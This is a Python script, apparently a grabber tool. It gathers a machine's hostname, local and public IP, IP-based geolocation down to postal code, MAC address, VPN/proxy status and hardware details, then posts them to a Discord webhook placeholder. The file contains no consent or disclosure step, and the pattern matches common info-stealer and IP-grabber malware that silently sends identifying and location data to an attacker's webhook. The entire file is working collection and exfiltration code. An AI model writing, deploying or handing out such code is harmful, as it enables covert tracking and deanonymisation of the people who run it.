import platform
import socket
from datetime import datetime
import psutil
import requests
from uuid import getnode as get_mac

discord_webhook_url = "YOUR_DISCORD_WEBHOOK_URL"

def send_to_discord(message_content):
    """Send the system information to a discord server."""
    try:
        payload = {"content": f"**System Information**\n```\n{message_content}\n```"}
        response = requests.post(discord_webhook_url, json=payload)

        if response.status_code == 204:
            print("System information sent to Discord.")
        else:
            print(f"Failed to send to Discord: {response.status_code}, {response.text}")
    except Exception as e:
        print(f"Error sending to Discord: {e}")

def get_system_info():
    """
    Gathers and returns system, network, and hardware information.
    """
    # Collecting basic system and host information
    uname = platform.uname()
    host = socket.gethostname()
    try:
        local_ip = socket.gethostbyname(host)
    except socket.gaierror:
        local_ip = "Unable to retrieve"

    # Boot time
    boot_time = datetime.fromtimestamp(psutil.boot_time())

    # Public IP
    try:
        public_ip = requests.get('https://api.ipify.org', timeout=10).text.strip()
    except requests.exceptions.RequestException as e:
        public_ip = "Unavailable"
        print(f"Error fetching public IP: {e}")

    # Geolocation information for public IP
    geo_info = {}
    if public_ip != "Unavailable":
        try:
            geo_info = requests.get(f'https://ipapi.co/{public_ip}/json').json()
        except requests.exceptions.RequestException as e:
            print(f"Error fetching geolocation info: {e}")
        except requests.exceptions.JSONDecodeError:
            print("Error decoding geolocation JSON response.")

    ip = geo_info.get("ip", "N/A")
    city = geo_info.get("city", "N/A")
    region = geo_info.get("region", "N/A")
    postal = geo_info.get("postal", "N/A")
    timezone = geo_info.get("timezone", "N/A")
    currency = geo_info.get("currency", "N/A")
    callcode = geo_info.get("country_calling_code", "N/A")
    country = geo_info.get("country_name", "N/A")

    # VPN/Proxy status
    try:
        vpn_response = requests.get('http://ip-api.com/json?fields=proxy')
        proxy = vpn_response.json()['proxy']
    except requests.exceptions.RequestException as e:
        proxy = "Unavailable"
        print(f"Error fetching vpn_response status: {e}")

    # MAC Address
    mac_address = get_mac()

    # Hardware info
    cpu_freq = psutil.cpu_freq()
    virtual_mem = psutil.virtual_memory()
    disk_partitions = psutil.disk_partitions()

    # Prepare system information message
    message_content = f"""
    ========== System Information ==========
    System: {uname.system}, Node: {uname.node}, Processor: {uname.processor}
    Boot Time: {boot_time}
    Local IP: {local_ip}
    Public IP: {public_ip}
    IP Details: {ip}, City: {city}, Region: {region}, Postal: {postal}
    Timezone: {timezone}, Currency: {currency}, Calling Code: {callcode}, Country: {country}
    MAC Address: {mac_address}
    VPN Status: {'Using VPN/Proxy' if proxy else 'Not Using VPN/Proxy'}
    CPU Frequency: {cpu_freq.max:.2f} MHz
    Total Memory: {virtual_mem.total / 1024 ** 3:.2f} GB
    ========== Disk Usage ==========
    """
    for partition in disk_partitions:
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            message_content += f"Partition {partition.device}: {usage.percent}% used\n"
        except PermissionError:
            message_content += f"Permission denied for {partition.device}\n"
        except Exception as e:
            message_content += f"Error retrieving disk usage for {partition.device}: {e}\n"

    send_to_discord(message_content)


if __name__ == "__main__":
    get_system_info()